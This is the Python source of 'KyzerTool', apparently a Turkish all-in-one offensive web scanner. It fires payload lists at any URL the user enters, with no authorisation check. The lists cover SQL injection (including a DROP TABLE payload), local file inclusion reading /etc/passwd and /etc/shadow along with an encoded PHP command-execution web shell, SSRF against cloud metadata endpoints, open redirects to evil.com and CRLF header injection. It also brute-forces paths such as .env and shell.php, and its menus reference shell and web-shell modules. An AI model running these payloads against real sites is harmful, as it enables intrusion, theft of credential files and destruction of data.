#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ╔═══════════════════════════════════════════════════╗
# ║           KyzerTool - by vNez               ║
# ║     All-In-One Web Security & Recon Tool         ║
# ╚═══════════════════════════════════════════════════╝

import sys
import os
import random

# Renk kontrolü
try:
    from colorama import Fore, Back, Style, init
    init(autoreset=True)
except ImportError:
    os.system("pip install colorama -q")
    from colorama import Fore, Back, Style, init
    init(autoreset=True)

def check_and_install(package, import_name=None):
    import importlib
    name = import_name or package
    try:
        importlib.import_module(name)
    except ImportError:
        os.system(f"pip install {package} -q")

# Gerekli kütüphaneler
for pkg, imp in [
    ("requests", "requests"),
    ("colorama", "colorama"),
    ("dnspython", "dns"),
    ("beautifulsoup4", "bs4"),
    ("urllib3", "urllib3"),
]:
    check_and_install(pkg, imp)

import requests
import socket
import threading
import time
import json
import re
import subprocess
from datetime import datetime
from urllib.parse import urljoin, urlparse, urlencode, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
import dns.resolver
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings()

requests.packages.urllib3.disable_warnings()

# ══════════════════════════════════════════
#              RENKLER & STİLLER
# ══════════════════════════════════════════
R  = Fore.RED
G  = Fore.GREEN
Y  = Fore.YELLOW
B  = Fore.BLUE
M  = Fore.MAGENTA
C  = Fore.CYAN
W  = Fore.WHITE
BR = Fore.RED + Style.BRIGHT
BG = Fore.GREEN + Style.BRIGHT
BY = Fore.YELLOW + Style.BRIGHT
BB = Fore.BLUE + Style.BRIGHT
BM = Fore.MAGENTA + Style.BRIGHT
BC = Fore.CYAN + Style.BRIGHT
BW = Fore.WHITE + Style.BRIGHT
RS = Style.RESET_ALL

def typewriter(text, delay=0.0012, color=""):
    """Metni daktilo (typewriter) efektiyle karakter karakter yazdırır — canlı his verir"""
    for ch in text:
        sys.stdout.write(f"{color}{ch}{RS}" if color else ch)
        sys.stdout.flush()
        time.sleep(delay)
    print()


def loading_animation(text="Yükleniyor", duration=0.8, color=None):
    """Kısa bir spinner animasyonu gösterir (modüller arası geçişte 'canlı' his verir)"""
    color = color or BC
    frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        sys.stdout.write(f"\r  {color}{frames[i % len(frames)]}{RS} {W}{text}...{RS}")
        sys.stdout.flush()
        time.sleep(0.06)
        i += 1
    sys.stdout.write(f"\r  {BG}✓{RS} {W}{text}... tamam{' '*15}{RS}\n")


def matrix_flash(lines=4, width=64):
    """Açılışta kısa bir 'matrix yağmuru' efekti (tamamen kozmetik, hacker hissi için)"""
    charset = "01ABCDEF!@#$%^&*<>/\\|"
    for _ in range(lines):
        line = ''.join(random.choice(charset) for _ in range(width))
        print(f"  {Fore.GREEN}{Style.DIM}{line}{RS}")
        time.sleep(0.03)


def banner(animated=True):
    os.system("clear" if os.name != "nt" else "cls")

    if animated:
        matrix_flash(lines=3)
        time.sleep(0.1)
        os.system("clear" if os.name != "nt" else "cls")

    art = f"""
{Fore.GREEN}{Style.BRIGHT}   ▄█   ▄▄▄▄███▄▄▄▄       ▄███████▄     ▄████████    ▄████████
  ███ ▄██▀▀▀███▀▀▀██▄   ██▀     ▄██   ███    ███   ███    ███
  ███ ███   ███   ███         ▄███▀   ███    █▀    ███    ███
  ███ ███   ███   ███   ▀█▀▄███▀▄▄    ███         ▄███▄▄▄▄██▀
  ███ ███   ███   ███    ▄███▀   ▀  ▀███████████ ▀▀███▀▀▀▀▀
  ███ ███   ███   ███  ▄███▀                ███ ▀███████████
  ███ ███   ███   ███ ███▄     ▄█    ▄█    ███    ███    ███
█▄ ███  ▀█   ███   █▀  ▀████████▀  ▄████████▀     ███    ███
▀▀                                                 ███    ███{RS}

{Fore.GREEN}{Style.BRIGHT}   ▄████████    ▄██████▄     ▄██████▄   ▄█           ▄████████
  ███    ███   ███    ███   ███    ███ ███          ███    ███
  ███    ███   ███    ███   ███    ███ ███          ███    █▀
 ▄███▄▄▄▄██▀   ███    ███   ███    ███ ███          ███
▀▀███▀▀▀▀▀     ███    ███   ███    ███ ███        ▀███████████
▀███████████   ███    ███   ███    ███ ███                 ███
  ███    ███   ███    ███   ███    ███ ███▌    ▄      ▄▄    ███
  ███    ███    ▀██████▀     ▀██████▀  █████▄▄██    ▄████████▀
  ███    ███                           ▀                       {RS}
"""
    print(art)

    tagline = "  [ All-In-One Web Security & Recon Framework ]"
    if animated:
        typewriter(tagline, delay=0.006, color=Fore.GREEN + Style.BRIGHT)
        time.sleep(0.05)
    else:
        print(f"{Fore.GREEN}{Style.BRIGHT}{tagline}{RS}")

    print(f"""
  {Style.DIM}{W}created by{RS} {BM}{Style.BRIGHT}vNez{RS}  {Style.DIM}│{RS}  {Style.DIM}{W}github:{RS} {BC}Kyzerz53{RS}  {Style.DIM}│{RS}  {BY}v2.0.0{RS}

  {Fore.GREEN}┌────────────────────────────────────────────────────────────┐{RS}
  {Fore.GREEN}│{RS}  {BG}●{RS} XSS / SQLi / LFI      {BG}●{RS} Recon & OSINT                 {Fore.GREEN}│{RS}
  {Fore.GREEN}│{RS}  {BG}●{RS} SSRF / CRLF           {BG}●{RS} Subdomain Keşfi (KyzerSubfinder) {Fore.GREEN}│{RS}
  {Fore.GREEN}│{RS}  {BG}●{RS} Open Redirect         {BG}●{RS} Port Tarama (KyzerNmap)       {Fore.GREEN}│{RS}
  {Fore.GREEN}│{RS}  {BG}●{RS} Directory Bruteforce  {BG}●{RS} Tor / Proxy Anonimlik Desteği {Fore.GREEN}│{RS}
  {Fore.GREEN}└────────────────────────────────────────────────────────────┘{RS}
""")

def print_info(msg):    print(f"  {BC}[*]{W} {msg}{RS}")
def print_ok(msg):      print(f"  {BG}[✓]{W} {msg}{RS}")
def print_warn(msg):    print(f"  {BY}[!]{W} {msg}{RS}")
def print_err(msg):     print(f"  {BR}[✗]{W} {msg}{RS}")
def print_vuln(msg):    print(f"  {BR}[ZAFIYET]{RS} {BG}{msg}{RS}")
def print_found(msg):   print(f"  {BM}[BULUNDU]{RS} {BW}{msg}{RS}")
def print_sep():        print(f"  {BC}{'─'*60}{RS}")

def get_headers():
    return {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    }

def save_output(filename, data):
    os.makedirs("output", exist_ok=True)
    path = f"output/{filename}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(path, "w", encoding="utf-8") as f:
        f.write(data)
    print_ok(f"Sonuçlar kaydedildi: {BY}{path}")

# ══════════════════════════════════════════
#   MODÜL 1: XSS TARAYICI (KyzerXSS Motoru)
#   Canary-probe + context-farkında doğrulama + DOM sink
#   Created by Kyzerz53
# ══════════════════════════════════════════
from modules.xss_menu import run_xss_menu
from modules.xss_scanner import XSSScanner

def xss_scan(url, full_menu=True):
    """
    KyzerXSS motorunu çalıştırır.
    full_menu=True  -> interaktif menü (anonimlik, kategori seçimi vb.)
    full_menu=False -> tam tarama otomatik (Tam Tarama modülü için)
    """
    if full_menu:
        run_xss_menu()
        return []
    else:
        scanner = XSSScanner(url, threads=30)
        findings = scanner.run_full(category="all", scan_forms=True, scan_dom=True, smart_probe=True)
        return findings

# ══════════════════════════════════════════
#          MODÜL 2: SQLi TARAYICI
# ══════════════════════════════════════════
SQLI_PAYLOADS = [
    "'",
    "''",
    "`",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "') OR ('1'='1",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1 AND 1=1",
    "1 AND 1=2",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1; DROP TABLE users--",
    "admin'--",
    "' OR 1=1#",
]

SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "ora-", "odbc", "microsoft ole db",
    "sqlite", "postgresql", "warning: mysql", "unclosed quotation",
    "syntax error", "mysql error", "sql error", "database error",
    "invalid query", "you have an error in your sql syntax",
    "supplied argument is not a valid mysql",
]

def sqli_scan(url):
    print_sep()
    print(f"\n  {BC}[SQLi TARAYICI]{RS} Hedef: {BY}{url}{RS}\n")
    found = []
    params = re.findall(r'[\?&]([^=&]+)=', url)
    
    if not params:
        print_warn("URL'de test edilecek parametre bulunamadı.")
        print_info("Örnek: http://site.com/page?id=1")
        return found
    
    print_info(f"Parametreler: {', '.join(params)}")
    
    for param in params:
        for payload in SQLI_PAYLOADS:
            test_url = re.sub(
                rf'({re.escape(param)}=)[^&]*',
                rf'\g<1>{quote(payload)}',
                url
            )
            try:
                r = requests.get(test_url, headers=get_headers(), verify=False, timeout=8)
                resp_lower = r.text.lower()
                for error in SQLI_ERRORS:
                    if error in resp_lower:
                        print_vuln(f"SQLi Bulundu! Param: {param} | Payload: {payload} | Hata: {error}")
                        found.append({"param": param, "payload": payload, "error": error})
                        break
            except:
                pass
    
    if not found:
        print_ok("SQLi zafiyeti tespit edilmedi.")
    else:
        print_warn(f"Toplam {len(found)} SQLi zafiyeti bulundu!")
    
    return found

# ══════════════════════════════════════════
#          MODÜL 3: LFI TARAYICI
# ══════════════════════════════════════════
LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../etc/shadow",
    "../../windows/win.ini",
    "../../boot.ini",
    "/etc/passwd",
    "/etc/shadow",
    "....//....//etc/passwd",
    "..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
]

LFI_INDICATORS = [
    "root:x:", "root:0:0", "[boot loader]", "[extensions]",
    "daemon:", "bin/bash", "bin/sh", "etc/passwd",
    "windows/system32",
]

def lfi_scan(url):
    print_sep()
    print(f"\n  {BC}[LFI TARAYICI]{RS} Hedef: {BY}{url}{RS}\n")
    found = []
    params = re.findall(r'[\?&]([^=&]+)=', url)
    
    if not params:
        print_warn("Test edilecek parametre bulunamadı.")
        return found
    
    print_info(f"Parametreler: {', '.join(params)}")
    
    for param in params:
        for payload in LFI_PAYLOADS:
            test_url = re.sub(
                rf'({re.escape(param)}=)[^&]*',
                rf'\g<1>{quote(payload)}',
                url
            )
            try:
                r = requests.get(test_url, headers=get_headers(), verify=False, timeout=8)
                for indicator in LFI_INDICATORS:
                    if indicator in r.text:
                        print_vuln(f"LFI Bulundu! Param: {param} | Payload: {payload}")
                        found.append({"param": param, "payload": payload})
                        break
            except:
                pass
    
    if not found:
        print_ok("LFI zafiyeti tespit edilmedi.")
    else:
        print_warn(f"Toplam {len(found)} LFI zafiyeti bulundu!")
    
    return found

# ══════════════════════════════════════════
#          MODÜL 4: SSRF TARAYICI
# ══════════════════════════════════════════
SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://169.254.169.254",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]",
    "http://2130706433",
    "http://0x7f000001",
    "http://017700000001",
    "dict://127.0.0.1:6379",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_PING",
]

def ssrf_scan(url):
    print_sep()
    print(f"\n  {BC}[SSRF TARAYICI]{RS} Hedef: {BY}{url}{RS}\n")
    found = []
    params = re.findall(r'[\?&]([^=&]+)=', url)
    
    if not params:
        print_warn("Test edilecek parametre bulunamadı.")
        return found
    
    print_info(f"{len(SSRF_PAYLOADS)} SSRF payload test ediliyor...")
    
    for param in params:
        for payload in SSRF_PAYLOADS:
            test_url = re.sub(
                rf'({re.escape(param)}=)[^&]*',
                rf'\g<1>{quote(payload)}',
                url
            )
            try:
                r = requests.get(test_url, headers=get_headers(), verify=False, timeout=6, allow_redirects=False)
                if r.status_code in [200, 301, 302] and (
                    "169.254" in r.text or "localhost" in r.text.lower() or
                    "root:" in r.text or "ami-id" in r.text
                ):
                    print_vuln(f"SSRF Bulundu! Param: {param} | Payload: {payload}")
                    found.append({"param": param, "payload": payload})
            except:
                pass
    
    if not found:
        print_ok("SSRF zafiyeti tespit edilmedi.")
        print_info("Manuel test için Burp Collaborator kullanmanızı öneririz.")
    else:
        print_warn(f"Toplam {len(found)} SSRF zafiyeti bulundu!")
    
    return found

# ══════════════════════════════════════════
#       MODÜL 5: OPEN REDIRECT TARAYICI
# ══════════════════════════════════════════
REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "////evil.com",
    "https:evil.com",
    "\\\\evil.com",
    "/\\evil.com",
    "https://evil.com%2F%2E%2E",
    "%0d%0ahttps://evil.com",
    "https%3A%2F%2Fevil.com",
    "http://evil.com",
    "//google.com/%2F..",
]

def open_redirect_scan(url):
    print_sep()
    print(f"\n  {BC}[OPEN REDIRECT TARAYICI]{RS} Hedef: {BY}{url}{RS}\n")
    found = []
    params = re.findall(r'[\?&]([^=&]+)=', url)
    
    redirect_params = ['url', 'redirect', 'next', 'return', 'returnUrl', 'to',
                       'goto', 'link', 'destination', 'continue', 'forward', 'rurl']
    
    all_params = list(set(params + redirect_params))
    print_info(f"{len(REDIRECT_PAYLOADS)} payload test ediliyor...")
    
    for param in all_params:
        for payload in REDIRECT_PAYLOADS:
            if param in params:
                test_url = re.sub(
                    rf'({re.escape(param)}=)[^&]*',
                    rf'\g<1>{quote(payload)}',
                    url
                )
            else:
                sep = "&" if "?" in url else "?"
                test_url = f"{url}{sep}{param}={quote(payload)}"
            
            try:
                r = requests.get(test_url, headers=get_headers(), verify=False,
                                 timeout=6, allow_redirects=False)
                location = r.headers.get("Location", "")
                if "evil.com" in location or "google.com" in location:
                    print_vuln(f"Open Redirect! Param: {param} | Location: {location}")
                    found.append({"param": param, "payload": payload, "location": location})
            except:
                pass
    
    if not found:
        print_ok("Open Redirect zafiyeti tespit edilmedi.")
    else:
        print_warn(f"Toplam {len(found)} Open Redirect bulundu!")
    
    return found

# ══════════════════════════════════════════
#          MODÜL 6: CRLF TARAYICI
# ══════════════════════════════════════════
CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie:crlf=injection",
    "%0aSet-Cookie:crlf=injection",
    "%0d%0a%20Set-Cookie:crlf=injection",
    "\r\nSet-Cookie:crlf=injection",
    "%0d%0aX-Custom-Header:crlf",
    "%0d%0a%09Set-Cookie:crlf=injection",
    "crlf%0d%0aSet-Cookie:test=injection",
]

def crlf_scan(url):
    print_sep()
    print(f"\n  {BC}[CRLF TARAYICI]{RS} Hedef: {BY}{url}{RS}\n")
    found = []
    
    print_info(f"{len(CRLF_PAYLOADS)} CRLF payload test ediliyor...")
    
    for payload in CRLF_PAYLOADS:
        test_url = url + payload
        try:
            r = requests.get(test_url, headers=get_headers(), verify=False,
                             timeout=6, allow_redirects=False)
            if "crlf" in str(r.headers).lower() or "crlf=injection" in str(r.headers):
                print_vuln(f"CRLF Enjeksiyonu Bulundu! Payload: {payload}")
                found.append({"payload": payload, "headers": dict(r.headers)})
        except:
            pass
    
    if not found:
        print_ok("CRLF zafiyeti tespit edilmedi.")
    else:
        print_warn(f"Toplam {len(found)} CRLF zafiyeti bulundu!")
    
    return found

# ══════════════════════════════════════════
#   MODÜL 7: SUBDOMAIN KEŞİF (KyzerSubfinder Motoru)
#   Passive kaynaklar + Active DNS brute force
#   Created by Kyzerz53
# ══════════════════════════════════════════
from modules.subdomain_menu import run_subdomain_menu
from modules.open_source_tools import run_open_source_tools
from modules.subdomain_enum import SubdomainEnum, save_results

def subdomain_scan(domain, full_menu=True):
    """
    KyzerSubfinder motorunu çalıştırır.
    full_menu=True  -> interaktif menü (anonimlik, wordlist seçimi vb.)
    full_menu=False -> tam tarama otomatik (Tam Tarama modülü için)
    """
    if full_menu:
        run_subdomain_menu()
        return []
    else:
        enum = SubdomainEnum(domain, threads=50)
        resolved = enum.run_full(wordlist_path="wordlists/subdomains.txt", do_bruteforce=True)
        found = [{"subdomain": s, "ip": ip} for s, ip in resolved.items()]
        return found

# ══════════════════════════════════════════
#   MODÜL 8: PORT TARAMA (KyzerNmap Motoru)
#   Gerçek nmap (varsa) + Kyzer Python fallback
#   Created by Kyzerz53
# ══════════════════════════════════════════
from modules.port_menu import run_port_menu
from modules.port_scanner import RealNmapScanner, KyzerPortScanner, get_nmap_path

def port_scan(host, full_menu=True):
    """
    KyzerNmap motorunu çalıştırır.
    full_menu=True  -> interaktif menü (motor seçimi, anonimlik, preset)
    full_menu=False -> tam tarama otomatik (Tam Tarama modülü için)
    """
    if full_menu:
        run_port_menu()
        return []
    else:
        nmap_path = get_nmap_path()
        if nmap_path:
            scanner = RealNmapScanner(host)
            result = scanner.run(preset="3")
            return result["open_ports"] if result else []
        else:
            scanner = KyzerPortScanner(host, threads=100)
            return scanner.run(port_range="common")

# ══════════════════════════════════════════
#       MODÜL 9: DİRECTORY BRUTEFORCE
# ══════════════════════════════════════════
DIRS = [
    "admin", "administrator", "login", "panel", "dashboard", "wp-admin",
    "phpmyadmin", "cpanel", "backup", "db", "database", "sql", "config",
    "conf", "configuration", "settings", "setup", "install", "upload",
    "uploads", "files", "images", "img", "media", "static", "assets",
    "css", "js", "api", "v1", "v2", "auth", "user", "users", "account",
    "accounts", "register", "signup", "logout", "reset", "forgot",
    "password", "passwords", ".git", ".env", ".htaccess", "robots.txt",
    "sitemap.xml", "web.config", "wp-config.php", "index.php", "info.php",
    "phpinfo.php", "test.php", "shell.php", "404.php", "error.php",
    "old", "new", "bak", "backup", "temp", "tmp", "cache", "log", "logs",
    "debug", "dev", "development", "staging", "prod", "production",
    "secret", "private", "hidden", "data", "download", "downloads",
]

def dir_bruteforce(url):
    print_sep()
    url = url.rstrip("/")
    print(f"\n  {BC}[DİRECTORY BRUTEFORCE]{RS} Hedef: {BY}{url}{RS}\n")
    found = []
    lock = threading.Lock()
    
    def check_dir(path):
        test_url = f"{url}/{path}"
        try:
            r = requests.get(test_url, headers=get_headers(), verify=False,
                             timeout=6, allow_redirects=False)
            if r.status_code in [200, 301, 302, 403]:
                code_color = BG if r.status_code == 200 else BY if r.status_code in [301, 302] else BR
                with lock:
                    print_found(f"{BY}{test_url}{W} [{code_color}{r.status_code}{W}] ({len(r.content)} byte)")
                    found.append({"url": test_url, "status": r.status_code, "size": len(r.content)})
        except:
            pass
    
    print_info(f"{len(DIRS)} yol test ediliyor...")
    
    with ThreadPoolExecutor(max_workers=30) as ex:
        futures = [ex.submit(check_dir, d) for d in DIRS]
        for _ in as_completed(futures):
            pass
    
    print_sep()
    if not found:
        print_ok("Erişilebilir dizin/dosya bulunamadı.")
    else:
        print_warn(f"Toplam {len(found)} yol bulundu!")
    
    return found

# ══════════════════════════════════════════
#       MODÜL 10: WHOIS & DNS BİLGİ
# ══════════════════════════════════════════
def dns_info(domain):
    print_sep()
    print(f"\n  {BC}[DNS & BİLGİ TOPLAMA]{RS} Hedef: {BY}{domain}{RS}\n")
    results = {}
    
    record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
    
    for rtype in record_types:
        try:
            answers = dns.resolver.resolve(domain, rtype)
            records = [str(r) for r in answers]
            results[rtype] = records
            print_found(f"{BY}{rtype:6}{W} → {BG}{', '.join(records[:3])}")
        except:
            pass
    
    # IP adresi
    try:
        ip = socket.gethostbyname(domain)
        print_found(f"{'IP':6} → {BG}{ip}")
        results['IP'] = ip
    except:
        pass
    
    # Whois (basit)
    try:
        result = subprocess.run(['whois', domain], capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            lines = [l for l in result.stdout.split('\n') 
                     if any(k in l.lower() for k in ['registrar', 'creation', 'expir', 'name server', 'registrant'])]
            if lines:
                print_sep()
                print_info("WHOIS Bilgileri:")
                for line in lines[:10]:
                    if line.strip():
                        print(f"    {W}{line.strip()}{RS}")
    except:
        pass
    
    return results

# ══════════════════════════════════════════
#       MODÜL 11: TAM TARAMA (ALL-IN-ONE)
# ══════════════════════════════════════════
def full_scan(target):
    print_sep()
    print(f"\n  {BM}[TAM TARAMA BAŞLADI]{RS} Hedef: {BY}{target}{RS}\n")
    print_info(f"Başlangıç: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
    
    results = {}
    parsed = urlparse(target)
    domain = parsed.netloc or target.replace("http://","").replace("https://","").split("/")[0]
    
    # 1. DNS Bilgi Toplama
    print(f"\n  {BM}━━━ ADIM 1: DNS & BİLGİ TOPLAMA ━━━{RS}")
    results['dns'] = dns_info(domain)
    
    # 2. Port Tarama
    print(f"\n  {BM}━━━ ADIM 2: PORT TARAMA ━━━{RS}")
    results['ports'] = port_scan(domain, full_menu=False)
    
    # 3. Subdomain
    print(f"\n  {BM}━━━ ADIM 3: SUBDOMAIN KEŞİF ━━━{RS}")
    results['subdomains'] = subdomain_scan(domain, full_menu=False)
    
    # 4. Directory Bruteforce
    print(f"\n  {BM}━━━ ADIM 4: DİRECTORY BRUTEFORCE ━━━{RS}")
    results['dirs'] = dir_bruteforce(target)
    
    # 5. XSS
    print(f"\n  {BM}━━━ ADIM 5: XSS TARAMA ━━━{RS}")
    results['xss'] = xss_scan(target, full_menu=False)
    
    # 6. SQLi
    print(f"\n  {BM}━━━ ADIM 6: SQLi TARAMA ━━━{RS}")
    results['sqli'] = sqli_scan(target)
    
    # 7. LFI
    print(f"\n  {BM}━━━ ADIM 7: LFI TARAMA ━━━{RS}")
    results['lfi'] = lfi_scan(target)
    
    # 8. SSRF
    print(f"\n  {BM}━━━ ADIM 8: SSRF TARAMA ━━━{RS}")
    results['ssrf'] = ssrf_scan(target)
    
    # 9. Open Redirect
    print(f"\n  {BM}━━━ ADIM 9: OPEN REDIRECT ━━━{RS}")
    results['redirect'] = open_redirect_scan(target)
    
    # 10. CRLF
    print(f"\n  {BM}━━━ ADIM 10: CRLF TARAMA ━━━{RS}")
    results['crlf'] = crlf_scan(target)
    
    # ÖZET
    print_sep()
    print(f"\n  {BC}╔══════════════════════════════════════╗")
    print(f"  ║         TARAMA ÖZETI                 ║")
    print(f"  ╚══════════════════════════════════════╝{RS}\n")
    
    total_vulns = 0
    items = [
        ("DNS Kayıtları",    len(results.get('dns', {}))),
        ("Açık Port",        len(results.get('ports', []))),
        ("Subdomain",        len(results.get('subdomains', []))),
        ("Dizin/Dosya",      len(results.get('dirs', []))),
        ("XSS Zafiyeti",     len(results.get('xss', []))),
        ("SQLi Zafiyeti",    len(results.get('sqli', []))),
        ("LFI Zafiyeti",     len(results.get('lfi', []))),
        ("SSRF Zafiyeti",    len(results.get('ssrf', []))),
        ("Open Redirect",    len(results.get('redirect', []))),
        ("CRLF Enjeksiyonu", len(results.get('crlf', []))),
    ]
    
    for label, count in items:
        color = BG if count > 0 else W
        vuln_label = ""
        if label.endswith("Zafiyeti") or label in ["Open Redirect", "CRLF Enjeksiyonu"]:
            total_vulns += count
            vuln_label = f" {BR}⚠ ZAFİYET!" if count > 0 else ""
        print(f"  {W}  {label:20} → {color}{count}{RS}{vuln_label}{RS}")
    
    print(f"\n  {BR}  Toplam Zafiyet: {total_vulns}{RS}")
    print(f"  {W}  Bitiş: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}{RS}\n")
    
    # Kaydet
    report = json.dumps(results, ensure_ascii=False, indent=2, default=str)
    save_output(f"full_scan_{domain}", report)
    
    return results

# ══════════════════════════════════════════
#              ANA MENÜ
# ══════════════════════════════════════════
_BANNER_SHOWN = False

def main_menu():
    global _BANNER_SHOWN
    while True:
        banner(animated=not _BANNER_SHOWN)
        _BANNER_SHOWN = True
        print(f"  {BC}╔══════════════════════════════════════════╗")
        print(f"  ║             ANA MENÜ                     ║")
        print(f"  ╠══════════════════════════════════════════╣")
        print(f"  ║  {BY}[1]{W}  XSS Tarayıcı                        {BC}║")
        print(f"  ║  {BY}[2]{W}  SQL Injection Tarayıcı               {BC}║")
        print(f"  ║  {BY}[3]{W}  LFI Tarayıcı                        {BC}║")
        print(f"  ║  {BY}[4]{W}  SSRF Tarayıcı                       {BC}║")
        print(f"  ║  {BY}[5]{W}  Open Redirect Tarayıcı              {BC}║")
        print(f"  ║  {BY}[6]{W}  CRLF Enjeksiyon Tarayıcı            {BC}║")
        print(f"  ╠══════════════════════════════════════════╣")
        print(f"  ║  {BG}[7]{W}  Subdomain Keşif                     {BC}║")
        print(f"  ║  {BG}[8]{W}  Port Tarama                         {BC}║")
        print(f"  ║  {BG}[9]{W}  Directory Bruteforce                {BC}║")
        print(f"  ║  {BG}[10]{W} DNS & Whois Bilgi Toplama           {BC}║")
        print(f"  ╠══════════════════════════════════════════╣")
        print(f"  ║  {BM}[11]{W} ★ TAM TARAMA (ALL-IN-ONE) ★        {BC}║")
        print(f"  ╠══════════════════════════════════════════╣")
        print(f"  ║  {BY}[12]{W} Shell Tools (CTF / LAB)             {BC}║")
        print(f"  ║  {BY}[13]{W} Web Shell Lab                       {BC}║")
        print(f"  ║  {BY}[14]{W} Open Source Tools                   {BC}║")
        print(f"  ╠══════════════════════════════════════════╣")
        print(f"  ║  {BR}[0]{W}  Çıkış                               {BC}║")
        print(f"  ╚══════════════════════════════════════════╝{RS}\n")
        
        choice = input(f"  {BC}[KyzerTool]{BG} >{W} {RS}").strip()
        
        if choice == "0":
            print(f"\n  {BY}İyi avlar! - vNez{RS}\n")
            sys.exit(0)
        
        elif choice == "1":
            # KyzerXSS kendi menüsünü yönetir (URL, anonimlik, kategori sorar)
            xss_scan(None, full_menu=True)

        elif choice in ["2","3","4","5","6"]:
            url = input(f"\n  {BC}Hedef URL (örn: http://site.com/page?id=1){W}: {RS}").strip()
            if not url.startswith("http"):
                url = "http://" + url
            
            if choice == "2": sqli_scan(url)
            elif choice == "3": lfi_scan(url)
            elif choice == "4": ssrf_scan(url)
            elif choice == "5": open_redirect_scan(url)
            elif choice == "6": crlf_scan(url)
        
        elif choice == "7":
            # KyzerSubfinder kendi menüsünü yönetir (domain, anonimlik, wordlist sorar)
            subdomain_scan(None, full_menu=True)

        elif choice == "8":
            # KyzerNmap kendi menüsünü yönetir (motor seçimi, anonimlik, preset)
            port_scan(None, full_menu=True)

        elif choice in ["9","10"]:
            target = input(f"\n  {BC}Hedef domain (örn: example.com){W}: {RS}").strip()
            target = target.replace("http://","").replace("https://","").split("/")[0]
            
            if choice == "9":
                url = input(f"\n  {BC}Hedef URL (örn: http://site.com){W}: {RS}").strip()
                if not url.startswith("http"):
                    url = "http://" + url
                dir_bruteforce(url)
            elif choice == "10": dns_info(target)
        
        elif choice == "11":
            target = input(f"\n  {BC}Hedef (URL veya domain){W}: {RS}").strip()
            if not target.startswith("http"):
                target = "http://" + target
            full_scan(target)

        elif choice == "12":
            try:
                from modules.shell_tools import run_shell_tools
                run_shell_tools()
            except ImportError:
                print_err("Shell Tools modülü bulunamadı!")

        elif choice == "13":
            try:
                from modules.webshell_lab import run_webshell_lab
                run_webshell_lab()
            except ImportError:
                print_err("Web Shell Lab modülü bulunamadı!")

        elif choice == "14":
            run_open_source_tools()
        
        else:
            print_err("Geçersiz seçim!")
        
        print(f"\n  {W}Devam etmek için Enter'a bas...{RS}", end="")
        input()

# ══════════════════════════════════════════
#              GİRİŞ NOKTASI
# ══════════════════════════════════════════
if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n\n  {BY}[!] Kullanıcı tarafından durduruldu. İyi avlar!{RS}\n")
        sys.exit(0)
